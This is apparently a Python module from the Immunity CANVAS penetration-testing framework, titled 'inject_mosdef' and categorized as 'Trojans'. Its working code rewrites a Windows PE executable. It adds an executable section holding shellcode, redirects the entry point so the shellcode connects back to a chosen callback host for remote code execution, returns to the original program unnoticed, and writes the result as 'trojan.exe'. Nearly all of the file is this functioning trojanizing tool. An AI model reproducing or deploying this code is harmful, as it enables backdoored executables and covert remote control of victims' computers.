#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys

if "." not in sys.path:
    sys.path.append(".")

import canvasengine

from exploitutils import *

from MOSDEF.pelib import *
from MOSDEF import mosdef
from operator import attrgetter
from exploitutils import *
from tcpexploit import tcpexploit

from shellcode.standalone.windows import payloads64, payloads
from shellcode.standalone.windows.basecode64 import basecode


NAME                = "inject_mosdef"
DESCRIPTION         = "Injects a MOSDEF callback into an already existing PE"

NOTES               = """
Inject a MOSDEF callback in a new section of the input binary.
Modifies OEP to point to the new section, after running the callback return execution to the original program.

Needs an universal listener.
"""

DOCUMENTATION          =  {}
DOCUMENTATION["Notes"] = NOTES
VERSION                = "1.0"

PROPERTY               = {}
PROPERTY['TYPE']       = "Trojans"

import shellcode.shellcodeGenerator as shellcodeGenerator

PE_MAGIC_LENGTH = 0x4
DIRECTORY_ENTRY_LENGTH = 0x8
SECTION_ENTRY_LENGTH = 0x28
IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT = 11
JMP_INSTR_LEN = 5


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.result             = ""
        self.name               = NAME
        self.out_filename       = "trojan.exe"
        self.in_filename        = None
        self.callback_host      = None
        self.callback_port      = 5555
        self.ARCH               = None
        self.shellcode_length   = 0

    def getargs(self):
        self.getarg("in_filename")
        self.getarg("out_filename")
        self.getarg("callback_host")
        self.getarg("callback_port")
        self.getarg("ARCH")

    def generate_checksum(self, data):
        # Taken from https://github.com/erocarrera/pefile
        checksum_offset = self.pe.PE.offset2PE + PE_MAGIC_LENGTH
        checksum_offset += self.pe.PE.IMGhdr.getSize()
        checksum_offset += 0x40 # 64

        checksum = 0
        # Verify the data is dword-aligned. Add padding if needed
        #
        remainder = len(data) % 4
        data_len = len(data) + ((4-remainder) * ( remainder != 0 ))

        for i in range( int(data_len / 4) ):
            # Skip the checksum field
            if i == int(checksum_offset / 4):
                continue
            if i+1 == (int(data_len / 4)) and remainder:
                dword = struct.unpack('I', data[i*4:]+ ('\0' * (4-remainder)) )[0]
            else:
                dword = struct.unpack('I', data[ i*4 : i*4+4 ])[0]
            # Optimized the calculation (thanks to Emmanuel Bourg for pointing it out!)
            checksum += dword
            if checksum >= 2**32:
                checksum = (checksum & 0xffffffff) + (checksum >> 32)

        checksum = (checksum & 0xffff) + (checksum >> 16)
        checksum = (checksum) + (checksum >> 16)
        checksum = checksum & 0xffff

        # The length is the one of the original data, not the padded one
        #
        return checksum + len(data)

    def align(self, address, alignment):
        return (((address + alignment - 1) / alignment) * alignment)

    def create_section(self):
        last_section = sorted(self.pe.PE.Sections.values(), key=attrgetter('VirtualAddress'))[-1]

        pointer_to_raw_data = self.align(len(self.file_content),
                                         self.pe.PE.IMGOPThdr.FileAlignment)
        new_virtual_address = last_section.VirtualAddress + last_section.VirtualSize
        new_virtual_address = self.align(new_virtual_address, self.pe.PE.IMGOPThdr.SectionAlignment)

        new_section = Section()
        new_section.Name = '.sdata'
        new_section.VirtualSize = self.align(len(self.shellcode),
                                             self.pe.PE.IMGOPThdr.FileAlignment)

        new_section.VirtualAddress = new_virtual_address
        new_section.SizeOfRawData = self.align(len(self.shellcode),
                                               self.pe.PE.IMGOPThdr.FileAlignment)
        new_section.PointerToRawData = pointer_to_raw_data
        new_section.PointerToRelocations = 0
        new_section.PointerToLinenumbers= 0
        new_section.NumberOfRelocations = 0
        new_section.NumberOfLinenumbers = 0
        new_section.Characteristics = 0xe00000e0

        return new_section

    def create_x64_shellcode(self):
        ending = """
        mov (%r15),%rsp
        add $0x8,%r15
        pop %r14
        pop %r13
        pop %r12
        pop %r11
        pop %r10
        pop %r9
        pop %r8
        pop %rbp
        pop %rdi
        pop %rsi
        pop %rdx
        pop %rcx
        pop %rbx
        pop %rax
        jmp %r15
        """

        p = payloads64.payloads()
        asm = p.InjectToSelf(self.callback_host, self.callback_port, ending=ending)
        bin = p.assemble(asm)

        return bin

    def create_shellcode(self):
        host = self.callback_host
        port = self.callback_port

        mosdef_type = self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
        mosdef_id = self.engine.getNewMosdefID(self)

        sc = shellcodeGenerator.win32()

        sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
        sc.addAttr("revert_to_self_before_importing_ws2_32", None)
        sc.addAttr("tcpconnect", {"port" : port, "ipaddress" : host})
        sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
        sc.addAttr("loadFDasreg", {"reg" : "esi"})
        sc.addAttr("RecvExecDepSafe", None) #MOSDEF
        sc.addAttr("ExitProcess", None)
        proxy_payload = sc.get()

        # Here we use a shellcode with a custom exit stub
        ending_shellcode = "andl $0xffffff00,%ebx\n"
        ending_shellcode += "jmp     %ebx"

        sc = shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp", {"subespval": 0})
        sc.addAttr("InjectToSelf", { "injectme" : proxy_payload,
                                     "DONTEXIT" : True,
                                     'customexit' : ending_shellcode})

        rawshellcode = sc.get()
        return rawshellcode

    def create_new_section_content(self):
        if self.win64:
            jmp_offset = self.new_section.VirtualAddress + JMP_INSTR_LEN + 8 - self.original_entry_point
            jmp_to_original_entry_point = mosdef.assemble("jmp $0x%16.16x\n" % uint64(-jmp_offset), self.ARCH)
            p = payloads64.payloads()
            padding = 8
            # rax, rbx, rcx, rdx, rsi, rdi, rsp, rbp, r8, r9, r10, r11, r12, r13, r14, r15
            heading ="""
                    push %rax
                    push %rbx
                    push %rcx
                    push %rdx
                    push %rsi
                    push %rdi
                    push %rbp
                    push %r8
                    push %r9
                    push %r10
                    push %r11
                    push %r12
                    push %r13
                    push %r14
                    """

            heading += """
            jmp findyou
        retpcloc:
            mov (%rsp),%r15
            ret
        findyou:
            call retpcloc
            and $0xffffffffffffff00,%r15
            mov %rsp,(%r15)
            """
        else:
            jmp_offset = self.new_section.VirtualAddress + JMP_INSTR_LEN - self.original_entry_point
            jmp_to_original_entry_point = mosdef.assemble("jmp $0x%8.8x\n" % uint32(-jmp_offset), self.ARCH)
            padding = 0
            p = payloads.payloads()

            heading = ''

        new_section_data = '\x90' * padding
        new_section_data += jmp_to_original_entry_point
        if heading:
            new_section_data += p.assemble(heading)
        new_section_data += self.shellcode
        new_section_data += '\x90' * (self.new_section.SizeOfRawData - len(new_section_data))
        return new_section_data

    def get_directories(self):
        directories = ''
        for index, directory in enumerate(self.pe.PE.Directories):
            if index == IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT:
                directory.VirtualAddress = 0
                directory.Size = 0
            directories += directory.raw()
        return directories

    def get_sections(self):
        sections = ''
        for section in sorted(self.pe.PE.Sections.values(), key=attrgetter('VirtualAddress')):
            sections += section.raw()

        sections += self.new_section.raw()

        return sections

    def get_fill_for_headers(self, data_len):
        return '\x00' * (self.pe.PE.IMGOPThdr.SizeOfHeaders - data_len)

    def get_fill_for_new_section(self):
        return '\x90' * (self.new_section.PointerToRawData - len(self.file_content))

    def get_bytes_until_pe(self):
        starting_bytes = self.pe.PE.offset2PE + PE_MAGIC_LENGTH
        return self.file_content[:starting_bytes]

    def run(self):
        self.getargs()
        filepath = self.in_filename

        self.win64 = self.ARCH == 'X64'

        if self.win64:
            logging.warning("x64 not implemented yet")
            return 0
            # self.shellcode = self.create_x64_shellcode()
        else:
            logging.info("x86 was selected")
            self.shellcode = self.create_shellcode()

        if not filepath:
            logging.error("Input filename is missing")
            return 0

        if not os.path.exists(filepath):
            logging.error("The input filename provided does not exists")

        logging.info("Injecting MOSDEF trojan to: {}".format(filepath))

        self.pe = PElib(win64=self.win64)

        self.pe.openfile(filepath)
        depends_file = file(filepath, 'rb')

        self.file_content = depends_file.read()

        new_file_data = self.get_bytes_until_pe()

        self.new_section = self.create_section()

        self.pe.PE.IMGhdr.NumberOfSections += 1
        new_file_data += self.pe.PE.IMGhdr.raw()

        self.original_entry_point = self.pe.PE.IMGOPThdr.AddressOfEntryPoint

        if self.win64:
            self.pe.PE.IMGOPThdr.AddressOfEntryPoint = self.new_section.VirtualAddress + 5 + 8
        else:
            self.pe.PE.IMGOPThdr.AddressOfEntryPoint = self.new_section.VirtualAddress + 5

        self.pe.PE.IMGOPThdr.SizeOfImage = self.new_section.VirtualAddress + self.new_section.SizeOfRawData
        new_file_data += self.pe.PE.IMGOPThdr.raw()

        new_file_data += self.get_directories()
        new_file_data += self.get_sections()

        new_file_data += self.get_fill_for_headers(len(new_file_data))

        new_file_data += self.file_content[self.pe.PE.IMGOPThdr.SizeOfHeaders:]

        new_file_data += self.get_fill_for_new_section()

        new_file_data += self.create_new_section_content()

        new_checksum = self.generate_checksum(new_file_data)

        logging.info("Writing into {}".format(self.out_filename))

        checksum_offset = self.pe.PE.offset2PE + PE_MAGIC_LENGTH
        checksum_offset += self.pe.PE.IMGhdr.getSize()
        checksum_offset += 0x40 # 64

        new_data = new_file_data[:checksum_offset]
        new_data += struct.pack('<I', new_checksum)
        new_data += new_file_data[checksum_offset+4:]

        file(self.out_filename, "wb").write(new_data)
        logging.info("All done")

        return 1

if __name__=="__main__":
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
